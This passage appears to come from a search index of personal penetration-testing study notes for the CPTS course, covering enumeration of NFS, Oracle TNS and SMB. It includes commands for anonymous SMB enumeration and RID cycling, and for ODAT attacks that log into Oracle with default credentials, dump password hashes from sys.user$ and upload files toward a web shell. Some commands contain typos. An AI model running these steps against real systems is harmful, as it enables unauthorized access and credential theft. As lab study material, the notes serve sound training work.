a subnet. Finally, additional options can be added to the hosts or subnets.</p> <p>![[Pasted image 20241107004705.png]]</p> <p>Let us create such an entry for test purposes and play around with the settings.</p> <pre><code>echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' &gt;&gt; /etc/exports\n</code></pre> <pre><code>systemctl restart nfs-kernel-server\n</code></pre> <pre><code>exportfs\n</code></pre> <p>We have shared the folder\u00a0<code>/mnt/nfs</code>\u00a0to the subnet\u00a0<code>10.129.14.0/24</code>\u00a0with the setting shown above. This means that all hosts on the network will be able to mount this NFS share and inspect the contents of this folder.</p>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#dangerous-settings","title":"Dangerous Settings","text":"<p>However, even with NFS, some settings can be dangerous for the company and its infrastructure. Here are some of them listed:</p> Option Description <code>rw</code> Read and write permissions. <code>insecure</code> Ports above 1024 will be used. <code>nohide</code> If another file system was mounted below an exported directory, this directory is exported by its own exports entry. <code>no_root_squash</code> All files created by root are kept with the UID/GID 0. <p>It is highly recommended to create a local VM and experiment with the settings. We will discover methods that will show us how the NFS server is configured. For this, we can create several folders and assign different options to each one. Then we can inspect them and see what settings can have what effect on the NFS share and its permissions and the enumeration process.</p> <p>We can take a look at the\u00a0<code>insecure</code>\u00a0option. This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.</p>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#footprinting-the-service","title":"Footprinting The Service","text":"<p>when footprinting NFS the TCP port <code>111</code> and <code>2049</code> are essential. WE can also get information about the NFS service and the host via RPC, as shown below in the example.</p> <pre><code>sudo nmap &lt;ip&gt; -p111,2049 -sV -sC\n</code></pre> <p>\u2500\u2500(kali\u327fkali)-[~/Desktop] \u2514\u2500$ sudo nmap -sV -sC -p111,2049 10.129.105.111 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 10:29 EST Nmap scan report for 10.129.105.111 Host is up (0.20s latency).</p> <p>PORT     STATE SERVICE VERSION 111/tcp  open  rpcbind 2-4 (RPC #100000) | rpcinfo:  |   program version    port/proto  service |   100000  2,3,4        111/tcp   rpcbind |   100000  2,3,4        111/udp   rpcbind |   100000  3,4          111/tcp6  rpcbind |   100000  3,4          111/udp6  rpcbind |   100003  3           2049/udp   nfs |   100003  3           2049/udp6  nfs |   100003  3,4         2049/tcp   nfs |   100003  3,4         2049/tcp6  nfs |   100005  1,2,3      39937/udp   mountd |   100005  1,2,3      40457/tcp   mountd |   100005  1,2,3      58286/udp6  mountd |   100005  1,2,3      59147/tcp6  mountd |   100021  1,3,4      36399/tcp6  nlockmgr |   100021  1,3,4      40427/tcp   nlockmgr |   100021  1,3,4      50906/udp   nlockmgr |   100021  1,3,4      51106/udp6  nlockmgr |   100227  3           2049/tcp   nfs_acl |   100227  3           2049/tcp6  nfs_acl |   100227  3           2049/udp   nfs_acl |_  100227  3           2049/udp6  nfs_acl 2049/tcp open  nfs     3-4 (RPC #100003)</p> <p>Once we have discovered the nfs service, we can mount it on our local machine.  - create a new empty folder for <code>NFS</code> share to be mounted to - navigate to it and see the content</p> <p>Show available NFS shares <pre><code>showmount -e &lt;ip&gt;\n</code></pre></p>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#mounting-nfs-share","title":"Mounting NFS Share","text":"<p><pre><code>mkdir target-nfs\nsudo mount -t nfs &lt;ip&gt;:/ ./target-nfs/ -o nolock\ncd target-nfs\ntree .\n</code></pre> ![[Pasted image 20241107104218.png]]</p>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#list-contents-with-username-and-group-names","title":"List Contents with Username and Group Names","text":"<pre><code>ls -l mnt/nfs/\n</code></pre> <p>![[Pasted image 20241107104630.png]]</p>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#list-contents-with-uid-and-guids","title":"List contents with UID and GUIDs","text":"<p><pre><code>ls -n mnt/nfs/\n</code></pre> ![[Pasted image 20241107104823.png]]</p>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#unmounting","title":"Unmounting","text":"<pre><code>cd ..\nsudo unmount ./target-nfs\n</code></pre>"},{"location":"CPTS/Footprinting/NFS%20Network%20File%20System/#all-the-commands-needed-for-enumeration-mount-and-unmount","title":"All The Commands needed for enumeration, mount and unmount","text":"<pre><code># Scan for open port\nnmap -p 111,2049 &lt;target_ip&gt;\n\n# Enumerate NFS Shares\nshowmount -e &lt;target_ip&gt;\n\n# Create local mount directory\nmkdir -p /mnt/nfs_share\n\n# Mount the NSF Share\nsudo mount -t nfs &lt;target_ip&gt;:/path/to/share /mnt/nfs_share\n\n# List Files in Mounthed NFS Share\nls /mnt/nfs_share\n\n#Unmount the NFS Share\nsudo umount /mnt/nfs_share\n</code></pre>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/","title":"Oracle - TNS Transparent Network Substate","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#overview","title":"Overview","text":"<p>Oracle TNS facilitates communication between Oracle databases and applications over networks using various protocols, such as IPX/SPX and TCP/IP.</p> <ul> <li>Introduced in: Oracle Net Services suite.</li> <li>Commonly used in: Healthcare, finance, retail industries.</li> <li>Key Features:<ul> <li>Built-in encryption for secure data transmission.</li> <li>Support for IPv6 and SSL/TLS encryption for secure communication.</li> <li>Enables name resolution, connection management, load balancing, and security enhancements.</li> </ul> </li> </ul>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#functional-capabilities","title":"Functional Capabilities","text":"<ol> <li> <p>Encryption:</p> <ul> <li>Provides an extra security layer over TCP/IP.</li> <li>Secures communication between client and server.</li> <li> <p>Database Administration Tools:</p> </li> <li> <p>Performance monitoring and analysis.</p> </li> <li>Error reporting and logging.</li> <li>Workload management and fault tolerance.</li> </ul> </li> </ol>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#default-configuration","title":"Default Configuration","text":"<ul> <li> <p>Port: Default listener port is TCP/1521 (modifiable).</p> </li> <li> <p>Protocol Support: TCP/IP, UDP, IPX/SPX, AppleTalk.</p> </li> <li> <p>Security Features:</p> <ul> <li>Authentication with hostnames, IP addresses, usernames, and passwords.</li> <li>Encryption of client-server communication via Oracle Net Services.</li> <li> <p>Configuration Files:</p> </li> <li> <p><code>tnsnames.ora:</code> Resolves service names to network addresses.</p> </li> <li><code>listener.ora:</code> Configures listener behavior and services it supports.</li> </ul> </li> </ul>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#file-locations","title":"File Locations","text":"<ul> <li>Found in: <code>$ORACLE_HOME/network/admin</code>.</li> <li> <p>Example <code>tnsnames.ora</code> entry:</p> <p><code>ORCL =   (DESCRIPTION =     (ADDRESS_LIST =       (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))     )     (CONNECT_DATA =       (SERVER = DEDICATED)       (SERVICE_NAME = orcl)     )   )</code></p> </li> <li> <p>Example <code>listener.ora</code> entry:</p> <p><code>SID_LIST_LISTENER =   (SID_LIST =     (SID_DESC =       (SID_NAME = PDB1)       (ORACLE_HOME = C:\\oracle\\product\\19.0.0\\dbhome_1)       (GLOBAL_DBNAME = PDB1)     )   )  LISTENER =   (DESCRIPTION_LIST =     (DESCRIPTION =       (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))     )   )</code></p> </li> </ul>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#security-considerations","title":"Security Considerations","text":"<ul> <li>Default passwords in older Oracle versions (e.g., CHANGE_ON_INSTALL, dbsnmp) should be updated.</li> <li>The PL/SQL Exclusion List can blacklist certain packages or types to prevent unauthorized access.</li> </ul>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#plsql-exclusion-list","title":"PL/SQL Exclusion List","text":"<ul> <li>File Location: <code>$ORACLE_HOME/sqldeveloper</code>.</li> <li>Purpose: Blocks execution of specified PL/SQL packages or types.</li> </ul> Setting Description |                      |                                                                                                                          || -------------------- | ------------------------------------------------------------------------------------------------------------------------ || <code>DESCRIPTION</code>        | A descriptor that provides a name for the database and its connection type.                                              ||                      |                                                                                                                          || <code>ADDRESS</code>            | The network address of the database, which includes the hostname and port number.                                        || <code>PROTOCOL</code>           | The network protocol used for communication with the server                                                              || <code>PORT</code>               | The port number used for communication with the server                                                                   || <code>CONNECT_DATA</code>       | Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier. || <code>INSTANCE_NAME</code>      | The name of the database instance the client wants to connect.                                                           || <code>SERVICE_NAME</code>       | The name of the service that the client wants to connect to.                                                             || <code>SERVER</code>             | The type of server used for the database connection, such as dedicated or shared.                                        || <code>USER</code>               | The username used to authenticate with the database server.                                                              || <code>PASSWORD</code>           | The password used to authenticate with the database server.                                                              || <code>SECURITY</code>           | The type of security for the connection.                                                                                 || <code>VALIDATE_CERT</code>      | Whether to validate the certificate using SSL/TLS.                                                                       || <code>SSL_VERSION</code>        | The version of SSL/TLS to use for the connection.                                                                        || <code>CONNECT_TIMEOUT</code>    | The time limit in seconds for the client to establish a connection to the database.                                      || <code>RECEIVE_TIMEOUT</code>    | The time limit in seconds for the client to receive a response from the database.                                        || <code>SEND_TIMEOUT</code>       | The time limit in seconds for the client to send a request to the database.                                              || <code>SQLNET.EXPIRE_TIME</code> | The time limit in seconds for the client to detect a connection has failed.                                              || <code>TRACE_LEVEL</code>        | The level of tracing for the database connection.                                                                        || <code>TRACE_DIRECTORY</code>    | The directory where the trace files are stored.                                                                          || <code>TRACE_FILE_NAME</code>    | The name of the trace file.                                                                                              || <code>LOG_FILE</code>           | The file where the log information is stored.                                                                            | <p>Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our\u00a0<code>Pwnbox</code>\u00a0instance in case it does not have these already. Here is a Bash script that does all of that:</p>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#oracle-tools-setupsh","title":"Oracle-Tools-setup.sh","text":"<p><pre><code>#!/bin/bash\n\nsudo apt-get install libaio1 python3-dev alien -y\ngit clone https://github.com/quentinhardy/odat.git\ncd odat/\ngit submodule init\ngit submodule update\nwget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip\nunzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip\nwget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip\nunzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip\nexport LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH\nexport PATH=$LD_LIBRARY_PATH:$PATH\npip3 install cx_Oracle\nsudo apt-get install python3-scapy -y\nsudo pip3 install colorlog termcolor passlib python-libnmap\nsudo apt-get install build-essential libgmp-dev -y\npip3 install pycryptodome\n</code></pre> After we can determine if the installation was successful by running the following command. <pre><code># Oracle Database Attacking Tool (odat)\n./odat.py -h\n</code></pre> Oracle Database Attacking Tool (<code>ODAT</code>) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation. ![[Pasted image 20241112111023.png]]</p> <p>[[Nmap]] <pre><code>sudo nmap -p1521 -sV &lt;ip&gt; --open\n\n#Nmap - SID Bruteforcing\nsudo nmap -p1521 -sV &lt;ip&gt; --open --script oracle-sid-brute\n</code></pre></p>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#odat","title":"ODAT","text":"<pre><code>## lets use all options\n./odat.py all -s &lt;ip&gt;\n\n##If you come across the following error\u00a0`sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from\u00a0[here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).\n\nsudo sh -c \"echo /usr/lib/oracle/12.2/client64/lib &gt; /etc/ld.so.conf.d/oracle-instantclient.conf\";sudo ldconfig\n</code></pre>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#once-we-found-the-user-and-password-by-running-the-odat-we-can-use-a-tool-sqlplus-to-login-to-the-database","title":"once we found the user and password by running the <code>odat</code> we can use a tool <code>sqlplus</code> to login to the database.","text":"<pre><code>sqlplus &lt;user&gt;/&lt;password&gt;@&lt;ip&gt;/XE\n</code></pre>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#oracle-rdbms-interaction","title":"Oracle RDBMS - Interaction","text":"<pre><code>select table_name from all_tables;\n\nselect * from user_role_privs;\n</code></pre>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#oracle-rdbms-database-enumeration","title":"Oracle RDBMS - Database Enumeration","text":"<pre><code>sqlplus scott/tiger@&lt;ip&gt;/XE as sysdba\n\nSQL&gt; select * from user_role_privs;\n</code></pre>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#oracle-rdbms-extract-password-hashes","title":"Oracle RDBMS - Extract Password Hashes","text":"<pre><code>select name, password from sys.user$;\n</code></pre> <p>Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:</p> OS Path Linux <code>/var/www/html</code> Windows <code>C:\\inetpub\\wwwroot</code> <p>First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.</p> <pre><code>echo \"Oracle File Upload Test\" &gt; testing.txt\n./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt\n</code></pre> <p>Finally, we can test if the file upload approach worked with\u00a0<code>curl</code>. Therefore, we will use a\u00a0<code>GET http://&lt;IP&gt;</code>\u00a0request, or we can visit via browser. <pre><code>curl -X GET http://10.129.204.235/testing.txt\n</code></pre> ![[Pasted image 20241113002632.png]]</p>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#exam-tips-key-points","title":"Exam Tips &amp; Key Points","text":"<ol> <li>Default Port: TCP/1521 \u2013 modify as needed.</li> <li>Two Key Config Files:<ul> <li><code>tnsnames.ora:</code> Client-side service resolution.</li> <li><code>listener.ora:</code> Server-side listener configuration.</li> </ul> </li> <li>Security Enhancements: Enable SSL/TLS, change default passwords, and use the PL/SQL Exclusion List for blacklisting.</li> <li>Real-Life Use Case: Useful in environments prioritizing data security and enterprise-grade performance.</li> </ol> <p>By remembering the critical configurations, key files, and security recommendations, you can approach Oracle TNS with confidence during exams or penetration testing scenarios.</p>"},{"location":"CPTS/Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/#enumerate-the-target-oracle-database-and-submit-the-password-hash-of-the-user-dbsnmp-as-the-answer","title":"Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.","text":"<p>![[Pasted image 20241113010632.png]]![[Pasted image 20241113010710.png]] ![[Pasted image 20241113010729.png]]</p>"},{"location":"CPTS/Footprinting/SMB/","title":"SMB","text":"<p>[!tip]- Tips Write tips here</p>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#overview","title":"Overview","text":"<ul> <li>Purpose: SMB (Sever Message Block) is a protocol that facilitates client-server communication for accessing files, directories, printers, and other network resources.</li> <li> </li> </ul>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#history-initially-popularized-in-lan-manager-and-lan-server-within-os2-it-remains-integral-in-windows-os-and-has-cross-platform-support-via-samba-in-linuxunix","title":"History: Initially popularized in LAN Manager and LAN Server within OS/2, it remains integral in windows os and has cross-platform support via Samba in Linux/Unix","text":"","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#functionality","title":"Functionality","text":"<ul> <li>File and Rersource Sharing:  Enables clients to access shared files, directories, and services (printers routers)  within the network.</li> <li> </li> </ul>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#cross-platform-support-smb-is-supported-in-windows-downward-compatible-and-on-linuxunix-using-smaba-allowing-inter-communication","title":"Cross-Platform Support SMB is supported in Windows( Downward-compatible) and on LInux/UNix using Smaba allowing inter-communication.","text":"","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#access-control","title":"Access Control:","text":"<ul> <li>Access Control Lists (ACLs) Define permissions (execute, read, full access) for specific user/groups</li> <li> </li> </ul>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#granularity-control-is-based-on-network-shares-which-may-differ-from-local-server-permissions","title":"Granularity: Control is based on network shares, which may differ from local server permissions.","text":"","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#samba-and-cifs","title":"Samba and CIFS:","text":"<ul> <li>Samba: A free, open-source implementation of the SMB protocol for Unix-based systems (e.g., Linux). It allows Unix systems to communicate with Windows systems, supporting file and printer sharing.</li> <li>CIFS (Common Internet File System): A specific version of SMB, created by Microsoft. It aligns with SMB version 1.0 and is sometimes referred to as \"SMB/CIFS.\"</li> <li>Samba and CIFS: Samba enables Unix-based systems to use CIFS, making it compatible with Windows systems.</li> </ul>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#ports-and-protocols","title":"Ports and Protocols:","text":"<ul> <li>SMB v1 / CIFS: Typically operates over TCP ports 137, 138, and 139 when using NetBIOS, and port 445 when using CIFS directly.</li> <li>SMB 2 and SMB 3: These newer versions use port 445 exclusively, without relying on NetBIOS.</li> </ul>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#smb-versions-and-key-features","title":"SMB Versions and Key Features:","text":"<ol> <li> <p>CIFS / SMB 1.0</p> <ul> <li>Supported in: Windows NT 4.0, Windows 2000</li> <li>Features: Communication via NetBIOS (TCP 137-139); later, direct TCP connections on port 445.</li> <li> <p>SMB 2.0</p> </li> <li> <p>Supported in: Windows Vista, Windows Server 2008</p> </li> <li>Features: Faster, improved security with message signing, basic file caching.</li> <li> <p>SMB 2.1</p> </li> <li> <p>Supported in: Windows 7, Windows Server 2008 R2</p> </li> <li>Features: Introduced file-locking improvements for better data consistency.</li> <li> <p>SMB 3.0</p> </li> <li> <p>Supported in: Windows 8, Windows Server 2012</p> </li> <li>Features: Added multichannel support, encryption, and remote storage access.</li> <li> <p>SMB 3.1.1</p> </li> <li> <p>Supported in: Windows 10, Windows Server 2016</p> </li> <li>Features: Integrity checks, AES-128 encryption for better security.</li> </ul> </li> </ol>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#samba-features-with-smb-versions","title":"Samba Features with SMB Versions:","text":"<ul> <li>Samba 3: Allows a Linux system to join a Windows Active Directory as a member.</li> <li>Samba 4: Adds full Active Directory domain controller functionality to Linux, enabling it to serve as an AD controller.</li> </ul>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#netbios-and-workgroups","title":"NetBIOS and Workgroups:","text":"<ul> <li>Workgroups: Group name identifying a collection of computers and resources on an SMB network.</li> <li>NetBIOS: An API originally for IBM networks, facilitating name registration on the network. Each machine registers its name, or uses a NetBIOS Name Server (NBNS) or Windows Internet Name Service (WINS) for name resolution.</li> </ul>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#samba-configuration","title":"Samba Configuration:","text":"<ul> <li>Config File: Samba settings are controlled through a text configuration file, typically located at <code>/etc/samba/smb.conf</code>. This file lets you define shared directories, access permissions, and other settings to customize Samba behavior. ![[Pasted image 20241106221938.png]]</li> </ul>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#default-configuration","title":"Default Configuration","text":"<p>Samba offers wide range of settings that we can configure. <pre><code>cat /etc/samba/smb.conf | grep -v \"#\\|\\;\"\n</code></pre> We see global settings and two shares that are intened for printers.  ![[Pasted image 20241106224846.png]]</p>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#dangerous-settings","title":"Dangerous Settings","text":"<p>![[Pasted image 20241106224955.png]]</p> <p><code>Highly recommended</code> to look and read through the smb man page <code>man smb</code></p> <p><pre><code>sudo systemctl restart smbd\n</code></pre> <code>-L</code> display list of server's shares with <code>smbclient</code> we use the so-called <code>null-session</code> (<code>-N</code>) which <code>anonymous</code> access without the input of existing users or valid passwords.</p>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#smbclient-connecting-to-the-share","title":"SMBclient- connecting to the Share","text":"<pre><code>smbclient -N -L //&lt;IP&gt;\n</code></pre> <p>![[Pasted image 20241106225404.png]] WE can use the <code>help</code> command on successful login, listing all the possible commands we can execute.</p> <p>![[Pasted image 20241106225550.png]]</p>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#download-files-from-smb","title":"Download Files from SMB","text":"<p><pre><code>get prep-prod.txt\n</code></pre> ![[Pasted image 20241106225651.png]]</p> <p><code>smbstatus</code> Command - purpose: <code>smbstatus</code> helps administrators monitor active Samba connections - info Display      - Samba Version: Shows which version of Samba is running     - Connected User: Lists who is connected, from which host, and which shared resources.     - Network Insight Essential for checking activity on subnets, even isolated ones, to ensure controlled access to shared resource.  - Domain-level security - Samba as a Domain Member: In domain-level secutiy mode, samba integrates with a windows domain. This setup allows samba to authenticate users through a Windows domain controller. Key Components - Domain Controller     - Acts as the central authentication server in a Windows domain.     - Maintains user credentials and passwords, usaully on a windows NT server. - Password Server: each workgroup has a designated password server, which generally a     domain controller. - User Authentication     - When a user logs in to access shared resources, the domain controller checks credentials stored in <code>NTDS.dit</code> (directory services database) and <code>SAM</code> (Security Authentication Module).     - Once verified, the user gains access to the necessary shares on other machines in the domain.     -     This structure enhances security by centralizing password management and ensuring that users are authenticated before accessing shared files across the network. ![[Pasted image 20241106230824.png]]</p>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#footprinting-the-service","title":"Footprinting the Service","text":"<p><pre><code>sudo nmap &lt;IP&gt; -sV -sC -p139, 445\n</code></pre> ![[Pasted image 20241106230948.png]]</p>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#advanced-smb-enumeration-with-rpcclient","title":"Advanced SMB Enumeration with <code>rpcclient</code>:","text":"<ul> <li>Purpose of <code>rpcclient</code>: This tool enables manual interaction with SMB by performing Microsoft Remote Procedure Call (MS-RPC) functions, allowing for specific data retrieval beyond what Nmap can typically provide.</li> </ul>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#what-is-remote-procedure-call-rpc","title":"What is Remote Procedure Call (RPC)?","text":"<ul> <li>RPC Concept: RPC allows processes on different networked devices to execute functions as if they were local, which is essential in distributed and client-server architectures.</li> <li>Functionality: RPC transmits parameters and returns values, enabling seamless communication and operational integration across networked systems.</li> </ul>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#useful-rpcclient-commands-for-smb-enumeration","title":"Useful <code>rpcclient</code> Commands for SMB Enumeration:","text":"<ol> <li> <p>Authentication and Basic Connection:</p> <ul> <li><code>rpcclient -U &lt;username&gt; &lt;IP&gt;</code>: Connects to the SMB service on a remote server with a specified username. Use <code>-N</code> if no password is required. <code>shell rcpclient -U \"\" &lt;IP&gt;</code> After the above command we can run the rest of these commands.</li> <li> <p>Enumerate Users:</p> </li> <li> <p><code>enumdomusers</code>: Lists all users within the domain. Essential for identifying potential accounts to target in further enumeration or testing.</p> </li> <li> <p>Enumerate Groups:</p> </li> <li> <p><code>enumdomgroups</code>: Retrieves all groups in the domain, allowing insight into group membership and permissions structures.</p> </li> <li> <p>Query User Information:</p> </li> <li> <p><code>queryuser &lt;username&gt;</code>: Displays detailed information about a specific user, such as account flags, logon times, and password policies.</p> </li> <li> <p>Enumerate Domain Policies:</p> </li> <li> <p><code>getdompwinfo</code>: Shows password policies for the domain, including password expiration and complexity requirements.</p> </li> <li> <p>Retrieve Shared Resources:</p> </li> <li> <p><code>netshareenum</code>: Lists all shared resources on the target system. This is useful for identifying shares beyond those visible through standard SMB enumeration.</p> </li> <li> <p>List Printers:</p> </li> <li> <p><code>enumprinters</code>: Displays available printers shared on the network, which may reveal additional infrastructure details or useful resources.</p> </li> <li> <p>Workstation Information:</p> </li> <li> <p><code>lsaquery</code>: Retrieves information about the workstation, including details about the operating system and its configuration.</p> </li> <li> <p>Lookup SID:</p> </li> <li> <p><code>lookupsids &lt;SID&gt;</code>: Translates a Security Identifier (SID) into its corresponding username or group name, helpful when SIDs appear in other enumeration outputs.</p> </li> <li> <p>Dump Password Policies:</p> </li> <li> <p><code>getusrdompwinfo</code>: Pulls domain-level password policies, giving insight into security configurations and any potential weaknesses in password complexity or expiration.</p> </li> <li> <p>List Domain Controllers:</p> </li> <li> <p><code>getdcinfo &lt;domain&gt;</code>: Returns the primary and backup domain controllers for a specified domain, crucial for understanding network architecture.</p> </li> <li> <p>Identify Trust Relationships:</p> </li> <li> <p><code>lsaenumsid</code>: Enumerates trusted domains, which can reveal interconnected domains and possible privilege escalation paths in larger environments.</p> </li> </ul> </li> </ol>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#practical-tips","title":"Practical Tips:","text":"<ul> <li>Combined Use: Pair <code>rpcclient</code> commands with other tools like <code>enum4linux</code> and <code>smbclient</code> to gather comprehensive information on SMB shares and domain users.</li> <li>Permissions: Some <code>rpcclient</code> commands may require specific user permissions to run successfully. Testing with different credentials may yield varied results.</li> </ul> <p>Using these advanced <code>rpcclient</code> commands allows for more granular control over SMB enumeration, providing insights into network structure, user accounts, and security policies.</p> <p><pre><code>rpcclient -U \"\" &lt;ip&gt;\n</code></pre> ![[Pasted image 20241106233456.png]]</p> <p>![[Pasted image 20241106233529.png]]</p> <p>We can create a For-loop using Bash where we send a command to the service using rpcclient and filter out the results.</p> <pre><code>for i in $(seq 500 1100); do rpcclient -N -U \"\" &lt;IP&gt; -c \"queryuser\" 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" &amp;&amp; echo \"\";done\n</code></pre> <p>An alternative to this would be a Python script from <code>impacket</code> called <code>samrdump.py</code> <pre><code>samrdump.py &lt;ip&gt;\n</code></pre></p> <p>The information we have already obtianed with <code>rcpclient</code> can also be obtianed using other tools. For example the <code>SMBMap</code> and <code>CrackMapExec</code> tools are also widely used and helpful for the enumeration of SMB services.</p> <pre><code>smbmap -N &lt;ip&gt;\n</code></pre>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#crackmapexec","title":"CrackMapExec","text":"<pre><code>crackmapexec smb &lt;ip&gt; --shares -u '' -p ''\n</code></pre> <p>Another tool worth mentioning is the so-called <code>enum4linux-ng</code> which is based on an older tool <code>enum4linx</code> This tool automates many of the queries but not all, and can return a large amount information. </p> <pre><code>git clone https://github.com/cddmp/enum4linux-ng.git\ncd enum4linux-ng\npip3 install -r requirements.txt\n</code></pre>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMB/#enum4linux-ng-enumeration","title":"Enum4linux-ng - ENumeration","text":"<pre><code>./enum4linux-ng.py &lt;IP&gt; -A\n</code></pre>","tags":["oscp","filesharing","smb"]},{"location":"CPTS/Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/","title":"SMTP Simple Mail Transfer Protocol","text":"<p>[!tip]- Tips Write tips here</p>","tags":["smtp"]},{"location":"CPTS/Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>","tags":["smtp"]},{"location":"CPTS/Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/#smtp-simple-mail-transfer-protocol-overview","title":"SMTP (Simple Mail Transfer Protocol) Overview","text":"<ul> <li>Purpose: SMTP is a protocol used for sending emails in IP networks.</li> <li>Usage:<ul> <li>Client to Server: Between an email client and an outgoing mail server.</li> <li>Server to Server: Between two SMTP servers for relaying emails.</li> </ul> </li> </ul>","tags":["smtp"]},{"location":"CPTS/Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/#key-smtp-ports","title":"Key SMTP Ports","text":"<ul> <li>Port 25: Default port for SMTP; used for unencrypted email transmission.</li> <li>Port 587: Commonly used for encrypted email transmission (using STARTTLS).</li> <li>Port 465: Often used for secure SSL/TLS connections to SMTP servers.</li> </ul>","tags":["smtp"]},{"location":"CPTS/Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/#smtp-components-workflow","title":"SMTP Components &amp; Workflow","text":"<ol> <li>Mail User Agent (MUA): Email client that initiates the email transmission.</li> <li>Mail Submission Agent (MSA): Verifies email validity (origin and integrity).</li> <li>Mail Transfer Agent (MTA): Handles email routing, storage, and spam checking.<ul> <li>Open Relay Attack: A vulnerability in improperly configured MTAs allowing 